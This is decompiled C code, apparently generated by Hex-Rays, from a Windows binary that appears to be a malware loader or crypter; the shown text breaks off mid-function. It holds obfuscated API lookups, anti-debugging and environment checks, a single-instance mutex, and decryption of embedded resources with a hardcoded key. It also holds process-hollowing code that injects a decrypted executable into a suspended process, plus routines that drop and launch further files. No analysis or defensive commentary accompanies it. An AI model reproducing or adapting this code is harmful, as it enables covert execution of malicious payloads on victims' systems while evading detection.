/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_40100A();
void __noreturn sub_40101F(); // weak
// int __userpurge sub_40102C@<eax>(int a1@<ebx>, int a2, int a3, LPCSTR lpString, int a5);
// int __usercall sub_401B1B@<eax>(int a1@<ebx>, LPSTR lpString1, int a3, LPCSTR lpString);
// char *__usercall sub_401E23@<eax>(int a1@<ebx>, int a2, _DWORD *a3);
int __cdecl sub_402007(int a1);
int sub_402105();
int sub_40224F();
LPCSTR __cdecl sub_402399(LPCSTR lpString1);
BOOL sub_4025EA();
BOOL sub_402684();
_BYTE *__cdecl sub_4026FF(int a1, _BYTE *a2, int a3);
BOOL sub_4027D7();
int sub_402830();
int sub_4028A8();
int sub_402930();
BOOL sub_402972();
int __cdecl sub_4029CB(int a1, int a2);
int __cdecl sub_402A0F(int a1, int a2, unsigned int a3, unsigned int a4);
int sub_402BDF();
// HANDLE __usercall StartAddress@<eax>(int a1@<ebx>);
// _BYTE *__usercall sub_403410@<eax>(int a1@<ebx>, int a2, SIZE_T dwBytes, int a4);
BOOL __cdecl sub_4034C2(LPVOID lpMem);
CHAR *__cdecl sub_4034DC(LPCSTR lpName);
int __cdecl sub_403505(int a1, _BYTE *a2);
char *__cdecl sub_40357C(char *a1, const char *a2);
LPVOID __cdecl sub_403591(SIZE_T dwBytes);
// char *__usercall sub_4035AA@<eax>(int a1@<ebx>, char *a2, char a3, unsigned int a4);
_BYTE *__cdecl ek_memcpy(_BYTE *a1, int a2, int a3);
int __cdecl sub_4035FF(char *a1);
// void __usercall __noreturn start(int a1@<ebx>);
int __cdecl sub_4036FC(char *a1, char **a2, unsigned int a3);
void __cdecl __noreturn sub_4037CF(UINT uExitCode); // idb
int __cdecl sub_403804(int (**a1)(void), unsigned int a2, int a3);
int sub_40382B();
// BOOL __stdcall CheckTokenMembership(HANDLE TokenHandle, PSID SidToCheck, PBOOL IsMember);
// BOOL __stdcall AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// PVOID __stdcall FreeSid(PSID pSid);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// DWORD __stdcall GetLastError();
// HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// int __stdcall lstrcmpA(LPCSTR lpString1, LPCSTR lpString2);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall IsDebuggerPresent();
// HANDLE __stdcall GetCurrentProcess();
// int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// DWORD __stdcall GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// LPSTR __stdcall GetCommandLineA();
// int __stdcall lstrlenA(LPCSTR lpString);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

const CHAR String[] = "9xcb[9HhD^yr5Wp?>^w^bf3595Gg736B"; // idb
_UNKNOWN unk_4040C4; // weak
int (*off_405000[2])(void) = { NULL, &loc_401000 }; // idb
_UNKNOWN unk_405008; // weak
int (*off_40500C[2])(void) = { NULL, &loc_4036E7 }; // idb
_UNKNOWN unk_405014; // weak
int (*dword_405018)(void) = NULL; // idb
_UNKNOWN unk_40501C; // weak
int (*dword_405020)(void) = NULL; // idb
_UNKNOWN unk_405024; // weak
CHAR aW[1] = "W"; // idb
CHAR LibFileName[1] = "R"; // idb
CHAR asc_40504C[1] = "X"; // idb
CHAR aN[1] = "N"; // idb
CHAR aZ[2] = "z\n"; // idb
CHAR aW_0[1] = "w"; // idb
CHAR aW_1[1] = "w"; // idb
CHAR aW_2[1] = "w"; // idb
CHAR aW_3[1] = "w"; // idb
CHAR aW_4[1] = "w"; // idb
CHAR aW_5[1] = "w"; // idb
CHAR aO[1] = "o"; // idb
CHAR byte_40510C = '\x7F'; // idb
CHAR aJ_1[1] = "j"; // idb
CHAR aU[1] = "u"; // idb
CHAR aU_0[1] = "u"; // idb
_UNKNOWN unk_40514C; // weak
_UNKNOWN unk_405190; // weak
CHAR ModuleName[1] = "]"; // idb
CHAR aJ_4[1] = "j"; // idb
CHAR aX7vF2[10] = "X\b\n=7V/F 2"; // idb
CHAR asc_4051C0[1] = "]"; // idb
CHAR aI[2] = "I\v"; // idb
CHAR aP[1] = "p"; // idb
CHAR aP_0[1] = "p"; // idb
CHAR aP_1[1] = "p"; // idb
CHAR aP_2[1] = "p"; // idb
CHAR asc_405260[2] = "L\v"; // idb
CHAR aJ[1] = "J"; // idb
CHAR ProcName[1] = "k"; // idb
CHAR aK[1] = "k"; // idb
CHAR aK_1[1] = "k"; // idb
CHAR aK_2[1] = "k"; // idb
CHAR aK_0[1] = "k"; // idb
CHAR aJ_0[1] = "j"; // idb
CHAR aT_0[1] = "t"; // idb
_UNKNOWN unk_4052E4; // weak
_UNKNOWN unk_4052FC; // weak
const char aJ76[] = "j7%6"; // idb
CHAR aN_0[1] = "N"; // idb
CHAR aJ_3[1] = "J"; // idb
CHAR asc_40536C[2] = "X\b"; // idb
CHAR aT[1] = "T"; // idb
CHAR asc_405374[1] = "]"; // idb
CHAR aJ_5[1] = "j"; // idb
CHAR aE[2] = "e\v"; // idb
CHAR asc_405390[2] = "x\b"; // idb
CHAR aM53bv[6] = "m53bV\b"; // idb
_UNKNOWN unk_4053A4; // weak
CHAR aT_1[1] = "t"; // idb
CHAR aZ_0[1] = "z"; // idb
CHAR aJ_2[1] = "j"; // idb
_UNKNOWN unk_4053DC; // weak
_UNKNOWN unk_4053F0; // weak
_UNKNOWN unk_40542C; // weak
int dword_405438 = 1; // weak
_BYTE byte_40543C[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405440[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405444[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405448[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_40544C[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405450[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405454[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405458[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_40545C[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405460[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405464[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405468[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_40546C[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405470[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405474[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405478[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_40547C[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405480[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405484[4] = { 124, 124, 0, 0 }; // idb
_BYTE byte_405488[4] = { 124, 124, 0, 0 }; // idb
CHAR String2[2] = "0"; // idb
char asc_405490[3] = "||"; // weak
char asc_405494[3] = "||"; // weak
char asc_405498[3] = "||"; // weak
CHAR a0[2] = "0"; // idb
char asc_4054A0[3] = "||"; // weak
char asc_4054A4[3] = "||"; // weak
char asc_4054A8[3] = "||"; // weak
CHAR a1[2] = "1"; // idb
CHAR a1_0[2] = "1"; // idb
CHAR asc_4054B4[2] = "\\"; // idb
CHAR a0_0[2] = "0"; // idb
CHAR a2[2] = "2"; // idb
CHAR a1_1[2] = "1"; // idb
CHAR a2_0[2] = "2"; // idb
CHAR asc_4054C8[2] = "\\"; // idb
CHAR asc_4054CC[2] = "-"; // idb
CHAR asc_4054D0[2] = "."; // idb
CHAR asc_4054D4[2] = " "; // idb
char asc_4054D8[2] = "\""; // weak
char asc_4054DC[2] = "\""; // weak
char asc_4054E0[3] = "%%"; // weak
char asc_4054E4[3] = "%%"; // weak
char asc_4054E8[3] = "%%"; // weak
char asc_4054EC[3] = "%%"; // weak
CHAR a0_1[2] = "0"; // idb
CHAR a0_2[2] = "0"; // idb
CHAR a1_2[2] = "1"; // idb
CHAR a2_1[2] = "2"; // idb
CHAR asc_405500[2] = "\\"; // idb
CHAR a1_3[2] = "1"; // idb
CHAR a1_4[2] = "1"; // idb
CHAR a0_3[2] = "0"; // idb
char byte_405510[] = { '0' }; // weak
CHAR a0_4[2] = "0"; // idb
CHAR a0_5[2] = "0"; // idb
CHAR a1_5[2] = "1"; // idb
CHAR asc_405530[2] = "\\"; // idb
CHAR asc_405534[2] = "\\"; // idb
CHAR a1_6[2] = "1"; // idb
CHAR a3[2] = "3"; // idb
LPCSTR lpString2 = NULL; // idb
CHAR byte_405548[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_405571[39] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_405598[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_4055C1[2] = { '\0', '\0' }; // idb
CHAR byte_4055C3[4] = { '\0', '\0', '\0', '\0' }; // idb
CHAR byte_4055C7[2] = { '\0', '\0' }; // idb
CHAR Name[17] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
char byte_4055DA[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
char byte_405603[261]; // idb
char byte_405708[6]; // idb
CHAR byte_40570E[295]; // idb
CHAR String1[2]; // idb
CHAR byte_405837[2]; // idb
char byte_405839[2]; // idb
char byte_40583B[6]; // idb
char byte_405841[9]; // idb
char byte_40584A[6]; // idb
char byte_405850[6]; // idb
CHAR byte_405856[41]; // idb
_UNKNOWN unk_40587F; // weak
_UNKNOWN unk_405881; // weak
CHAR byte_405883[41]; // idb
CHAR byte_4058AC[120]; // idb
_UNKNOWN unk_405924; // weak
_UNKNOWN unk_40594D; // weak
CHAR byte_405A52[1698]; // idb
LPSTR dword_4060F4; // idb
int dword_4060F8; // weak
LPSTR lpString1; // idb
int dword_406100; // weak
int dword_406104; // weak
HMODULE dword_406108; // idb
HMODULE hModule; // idb
HMODULE dword_406110; // idb
HMODULE dword_406114; // idb
HMODULE dword_406118; // idb
HMODULE dword_40611C; // idb
int (__stdcall *dword_406120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406124)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406128)(_DWORD); // weak
int (__stdcall *dword_40612C)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406130)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406134)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_UNKNOWN unk_406138; // weak
_UNKNOWN unk_40613C; // weak
_UNKNOWN unk_406140; // weak
CHAR Buffer[1024]; // idb
int dword_406548; // weak
int dword_40654C; // weak
int dword_406560[32]; // idb
HANDLE hHeap; // idb
int (*dword_4065E4)(void); // weak


//----- (0040100A) --------------------------------------------------------
int sub_40100A()
{
  int result; // eax

  result = lstrlenA("9xcb[9HhD^yr5Wp?>^w^bf3595Gg736B");
  dword_4060F8 = result;
  return result;
}
// 4060F8: using guessed type int dword_4060F8;

//----- (0040101F) --------------------------------------------------------
void __noreturn sub_40101F()
{
  ExitProcess(0);
}
// 40101F: using guessed type void __noreturn sub_40101F();

//----- (0040102C) --------------------------------------------------------
int __userpurge sub_40102C@<eax>(int a1@<ebx>, int a2, int a3, LPCSTR lpString, int a5)
{
  const char *v6; // eax
  const char *v7; // eax
  const char *v8; // eax
  CHAR *v9; // eax
  CHAR *v10; // eax
  HANDLE hFile; // [esp+2Ch] [ebp-40h]
  char *lpBuffer; // [esp+30h] [ebp-3Ch]
  LPCVOID lpBuffera; // [esp+30h] [ebp-3Ch]
  unsigned int v14; // [esp+34h] [ebp-38h] BYREF
  const char *v15; // [esp+38h] [ebp-34h]
  LPSTR v16; // [esp+3Ch] [ebp-30h]
  int i; // [esp+40h] [ebp-2Ch]
  LPSTR v18; // [esp+44h] [ebp-28h]
  int v19[2]; // [esp+48h] [ebp-24h] BYREF
  LPSTR lpString1; // [esp+50h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v21; // [esp+54h] [ebp-18h]
  LPCSTR lpString2; // [esp+58h] [ebp-14h]
  char *v23; // [esp+5Ch] [ebp-10h]
  HANDLE hHandle; // [esp+60h] [ebp-Ch]
  int *v25; // [esp+64h] [ebp-8h]
  DWORD nNumberOfBytesToWrite; // [esp+68h] [ebp-4h] BYREF

  sub_402930();
  dword_4060F4 = (LPSTR)sub_403591(0x105u);
  ::lpString1 = (LPSTR)sub_403591(0x105u);
  ::lpString2 = (LPCSTR)sub_403591(0x105u);
  sub_402BDF();
  dword_406108 = LoadLibraryA(LibFileName);
  hModule = LoadLibraryA(asc_40504C);
  dword_406110 = LoadLibraryA(aW);
  dword_406114 = LoadLibraryA(aN);
  dword_406118 = LoadLibraryA(asc_405260);
  dword_40611C = LoadLibraryA(aJ);
  dword_406120 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, ProcName);
  dword_406124 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, aK);
  dword_406128 = (int (__stdcall *)(_DWORD))GetProcAddress(hModule, aK_0);
  dword_40612C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(hModule, aK_1);
  dword_406130 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, aK_2);
  dword_406134 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_40611C, aJ_0);
  dword_406104 = sub_402684();
  dword_405438 = sub_4025EA();
  v25 = v19;
  v19[1] = (int)sub_40101F;
  v21 = NtCurrentTeb()->NtTib.ExceptionList;
  v19[0] = (int)v21;
  if ( sub_402972() )
    return 0;
  GetModuleFileNameA(0, ::lpString1, 0x104u);
  v6 = (const char *)sub_402007(1);
  sub_40357C(dword_4060F4, v6);
  if ( !dword_4060F4 )
  {
    v7 = (const char *)sub_402007(0);
    sub_40357C(dword_4060F4, v7);
  }
  v23 = 0;
  v14 = 0;
  nNumberOfBytesToWrite = 0;
  v23 = sub_401E23(a1, (int)&unk_4053A4, &v14);
  if ( !v23 || !v14 )
    return 0;
  v23 = (char *)sub_402A0F((int)v23, (int)"9xcb[9HhD^yr5Wp?>^w^bf3595Gg736B", v14, dword_4060F8);
  if ( !v23 || !v14 )
    return 0;
  v15 = 0;
  v15 = (const char *)sub_403505((int)v23, byte_40543C);
  if ( !v15 )
    return 0;
  sub_40357C(byte_405548, v15);
  v15 = (const char *)sub_403505(0, byte_405440);
  sub_40357C(byte_405571, v15);
  v15 = (const char *)sub_403505(0, byte_405444);
  sub_40357C(byte_405598, v15);
  v15 = (const char *)sub_403505(0, byte_405448);
  sub_40357C(byte_4055C1, v15);
  v15 = (const char *)sub_403505(0, byte_40544C);
  sub_40357C(byte_4055C3, v15);
  v15 = (const char *)sub_403505(0, byte_405450);
  sub_40357C(byte_4055C7, v15);
  v15 = (const char *)sub_403505(0, byte_405454);
  sub_40357C(byte_4055DA, v15);
  v15 = (const char *)sub_403505(0, byte_405458);
  sub_40357C(byte_405603, v15);
  v15 = (const char *)sub_403505(0, byte_40545C);
  sub_40357C(byte_405708, v15);
  v15 = (const char *)sub_403505(0, byte_405460);
  sub_40357C(byte_40570E, v15);
  v15 = (const char *)sub_403505(0, byte_405464);
  sub_40357C(String1, v15);
  v15 = (const char *)sub_403505(0, byte_405468);
  sub_40357C(byte_405837, v15);
  v15 = (const char *)sub_403505(0, byte_40546C);
  sub_40357C(byte_405839, v15);
  v15 = (const char *)sub_403505(0, byte_405470);
  sub_40357C(byte_40583B, v15);
  v15 = (const char *)sub_403505(0, byte_405474);
  sub_40357C(byte_405841, v15);
  v15 = (const char *)sub_403505(0, byte_405478);
  sub_40357C(byte_40584A, v15);
  v15 = (const char *)sub_403505(0, byte_40547C);
  sub_40357C(byte_405850, v15);
  v15 = (const char *)sub_403505(0, byte_405480);
  sub_40357C(byte_405856, v15);
  v15 = (const char *)sub_403505(0, byte_405484);
  sub_40357C(Name, v15);
  for ( i = 0; i < 5; ++i )
  {
    v15 = (const char *)sub_403505(0, byte_405488);
    sub_40357C((char *)&unk_40587F + 9 * i, v15);
    if ( lstrcmpA((LPCSTR)&unk_40587F + 9 * i, String2) )
    {
      v15 = (const char *)sub_403505(0, asc_405490);
      sub_40357C((char *)&unk_405881 + 9 * i, v15);
      v15 = (const char *)sub_403505(0, asc_405494);
      sub_40357C(&byte_405883[9 * i], v15);
    }
  }
  for ( i = 0; i < 5; ++i )
  {
    v15 = (const char *)sub_403505(0, asc_405498);
    sub_40357C(&byte_4058AC[424 * i], v15);
    if ( lstrcmpA(&byte_4058AC[424 * i], a0) )
    {
      v15 = (const char *)sub_403505(0, asc_4054A0);
      sub_40357C((char *)&unk_405924 + 424 * i, v15);
      v15 = (const char *)sub_403505(0, asc_4054A4);
      sub_40357C((char *)&unk_40594D + 424 * i, v15);
      v15 = (const char *)sub_403505(0, asc_4054A8);
      sub_40357C(&byte_405A52[424 * i], v15);
    }
  }
  CreateMutexA(0, 1, Name);
  if ( GetLastError() == 183 )
    return 0;
  if ( !lstrcmpA(String1, ::a1) && (sub_402830() || sub_4028A8()) )
    return 0;
  if ( !lstrcmpA(byte_405837, a1_0) && sub_4027D7() )
    return 0;
  v8 = sub_402399(::lpString1);
  sub_40357C(::lpString1, v8);
  lpString1 = (LPSTR)sub_403591(0x105u);
  if ( dword_406104 && !dword_405438 && lstrcmpA(byte_405856, aT) )
  {
    if ( lstrcmpA(byte_405856, asc_405374) )
    {
      v9 = sub_4034DC(aJ_5);
      sub_40357C(lpString1, v9);
      lstrcatA(lpString1, asc_4054B4);
      lstrcatA(lpString1, byte_405856);
    }
    else
    {
      sub_40357C(lpString1, dword_4060F4);
    }
  }
  else
  {
    sub_40357C(lpString1, ::lpString1);
  }
  hHandle = 0;
  if ( lstrcmpA(byte_4058AC, a0_0) )
    hHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
  v18 = (LPSTR)sub_403591(0x105u);
  v16 = (LPSTR)sub_403591(0x105u);
  lpString2 = 0;
  for ( i = 0; i <= 5; ++i )
  {
    sub_40357C(v18, byte_405841);
    lpString2 = (LPCSTR)sub_403591(0xAu);
    sub_4026FF(i, lpString2, 10);
    lstrcatA(v18, lpString2);
    if ( !i
      || !lstrcmpA((LPCSTR)&unk_405881 + 9 * i - 9, ::a2)
      || !lstrcmpA((LPCSTR)&unk_405881 + 9 * i - 9, a1_1) && dword_406100 )
    {
      lpBuffer = sub_401E23(a1, (int)v18, &nNumberOfBytesToWrite);
      if ( !lpBuffer )
        break;
      if ( !nNumberOfBytesToWrite )
        break;
      lpBuffera = (LPCVOID)sub_402A0F(
                             (int)lpBuffer,
                             (int)"9xcb[9HhD^yr5Wp?>^w^bf3595Gg736B",
                             nNumberOfBytesToWrite,
                             dword_4060F8);
      if ( !lpBuffera || !nNumberOfBytesToWrite )
        break;
      if ( !i || lstrcmpA((LPCSTR)&unk_40587F + 9 * i - 9, a2_0) )
      {
        if ( !sub_401B1B(a1, lpString1, (int)lpBuffera, lpString) )
          return 0;
      }
      else
      {
        v10 = sub_4034DC(aM53bv);
        sub_40357C(v16, v10);
        lstrcatA(v16, asc_4054C8);
        lstrcatA(v16, lpString2);
        lstrcatA(v16, asc_4054CC);
        lstrcatA(v16, Name);
        lstrcatA(v16, asc_4054D0);
        lstrcatA(v16, &byte_405883[9 * i - 9]);
        hFile = CreateFileA(v16, 0x40000000u, 0, 0, 2u, 0, 0);
        if ( hFile == (HANDLE)-1 )
          break;
        WriteFile(hFile, lpBuffera, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);
        CloseHandle(hFile);
        dword_406134(0, &aM53bv[4], v16, &unk_406138, 0, 1);
      }
    }
    nNumberOfBytesToWrite = 0;
    sub_4034C2((LPVOID)lpString2);
  }
  if ( hHandle )
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
  return 0;
}
// 40101F: using guessed type void __noreturn sub_40101F();
// 405438: using guessed type int dword_405438;
// 4060F8: using guessed type int dword_4060F8;
// 406100: using guessed type int dword_406100;
// 406104: using guessed type int dword_406104;
// 406120: using guessed type int (__stdcall *dword_406120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406124: using guessed type int (__stdcall *dword_406124)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406128: using guessed type int (__stdcall *dword_406128)(_DWORD);
// 40612C: using guessed type int (__stdcall *dword_40612C)(_DWORD, _DWORD, _DWORD);
// 406130: using guessed type int (__stdcall *dword_406130)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406134: using guessed type int (__stdcall *dword_406134)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401B1B) --------------------------------------------------------
int __usercall sub_401B1B@<eax>(int a1@<ebx>, LPSTR lpString1, int a3, LPCSTR lpString)
{
  FARPROC v5; // [esp+0h] [ebp-350h]
  int v6; // [esp+4h] [ebp-34Ch]
  int v7; // [esp+8h] [ebp-348h] BYREF
  int v8; // [esp+Ch] [ebp-344h]
  int v9; // [esp+18h] [ebp-338h]
  int i; // [esp+1Ch] [ebp-334h]
  _DWORD *v11; // [esp+20h] [ebp-330h]
  FARPROC v12; // [esp+24h] [ebp-32Ch]
  FARPROC v13; // [esp+28h] [ebp-328h]
  FARPROC v14; // [esp+2Ch] [ebp-324h]
  int v15[17]; // [esp+30h] [ebp-320h] BYREF
  int v16; // [esp+74h] [ebp-2DCh] BYREF
  FARPROC v17; // [esp+78h] [ebp-2D8h]
  int v18[179]; // [esp+7Ch] [ebp-2D4h] BYREF
  FARPROC v19; // [esp+348h] [ebp-8h]
  FARPROC v20; // [esp+34Ch] [ebp-4h]

  sub_4035AA(a1, (char *)v15, 0, 0x44u);
  v15[0] = 68;
  v18[0] = 65543;
  v9 = a3;
  if ( *(_WORD *)a3 != 23117 )
    return 0;
  v6 = *(_DWORD *)(v9 + 60) + a3;
  if ( *(_DWORD *)v6 != 17744 )
    return 0;
  v5 = GetProcAddress(dword_406108, aZ);
  v12 = GetProcAddress(dword_406108, aO);
  v20 = GetProcAddress(dword_406110, aW_0);
  v13 = GetProcAddress(dword_406110, aW_1);
  v17 = GetProcAddress(dword_406110, aW_2);
  v19 = GetProcAddress(dword_406110, aW_3);
  v14 = GetProcAddress(dword_406110, aW_4);
  if ( lstrlenA(lpString) > 0 )
  {
    lstrcatA(lpString1, asc_4054D4);
    lstrcatA(lpString1, lpString);
  }
  if ( !((int (__stdcall *)(_DWORD, LPSTR, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, int *, int *))v5)(
          0,
          lpString1,
          0,
          0,
          0,
          4,
          0,
          0,
          v15,
          &v7) )
    return 0;
  ((void (__stdcall *)(int, _DWORD))v20)(v7, *(_DWORD *)(v6 + 52));
  if ( !((int (__stdcall *)(int, _DWORD, _DWORD, int, int))v12)(
          v7,
          *(_DWORD *)(v6 + 52),
          *(_DWORD *)(v6 + 80),
          12288,
          64) )
    return 0;
  v16 = 0;
  ((void (__stdcall *)(int, _DWORD, int, _DWORD, int *))v13)(v7, *(_DWORD *)(v6 + 52), a3, *(_DWORD *)(v6 + 84), &v16);
  if ( !v16 )
    return 0;
  for ( i = 0; i < *(unsigned __int16 *)(v6 + 6); ++i )
  {
    v11 = (_DWORD *)(a3 + 40 * i + *(_DWORD *)(v9 + 60) + 248);
    ((void (__stdcall *)(int, int, int, _DWORD, _DWORD))v13)(v7, v11[3] + *(_DWORD *)(v6 + 52), v11[5] + a3, v11[4], 0);
  }
  ((void (__stdcall *)(int, int *))v17)(v8, v18);
  ((void (__stdcall *)(int, int, int, int, _DWORD))v13)(v7, v18[41] + 8, v6 + 52, 4, 0);
  v18[44] = *(_DWORD *)(v6 + 40) + *(_DWORD *)(v6 + 52);
  ((void (__stdcall *)(int, int *))v19)(v8, v18);
  ((void (__stdcall *)(int, _DWORD))v14)(v8, 0);
  return 1;
}

//----- (00401E23) --------------------------------------------------------
char *__usercall sub_401E23@<eax>(int a1@<ebx>, int a2, _DWORD *a3)
{
  int v4; // [esp+14h] [ebp-34h]
  int v5; // [esp+18h] [ebp-30h]
  int v6; // [esp+1Ch] [ebp-2Ch]
  int v7; // [esp+20h] [ebp-28h]
  int v8; // [esp+24h] [ebp-24h]
  int i; // [esp+28h] [ebp-20h]
  int j; // [esp+28h] [ebp-20h]
  FARPROC v11; // [esp+2Ch] [ebp-1Ch]
  FARPROC v12; // [esp+30h] [ebp-18h]
  char *v13; // [esp+34h] [ebp-14h]
  FARPROC v14; // [esp+38h] [ebp-10h]
  _BYTE *v15; // [esp+3Ch] [ebp-Ch]
  _BYTE *v16; // [esp+3Ch] [ebp-Ch]
  int v17; // [esp+40h] [ebp-8h]
  FARPROC v18; // [esp+44h] [ebp-4h]

  v18 = GetProcAddress(dword_406108, &byte_40510C);
  v11 = GetProcAddress(dword_406108, aJ_1);
  v14 = GetProcAddress(dword_406108, aU);
  v12 = GetProcAddress(dword_406108, aU_0);
  for ( i = 1; ; ++i )
  {
    v15 = sub_403591(0xAu);
    sub_4026FF(i, v15, 10);
    v8 = ((int (__stdcall *)(_DWORD, _BYTE *, int))v18)(0, v15, a2);
    if ( !v8 )
      break;
    *a3 += ((int (__stdcall *)(_DWORD, int))v11)(0, v8);
    sub_4034C2(v15);
  }
  if ( !*a3 )
    return 0;
  v13 = (char *)sub_403591(*a3 + 1);
  sub_4035AA(a1, v13, 0, *a3 + 1);
  v17 = 0;
  for ( j = 1; ; ++j )
  {
    v16 = sub_403591(0xAu);
    sub_4026FF(j, v16, 10);
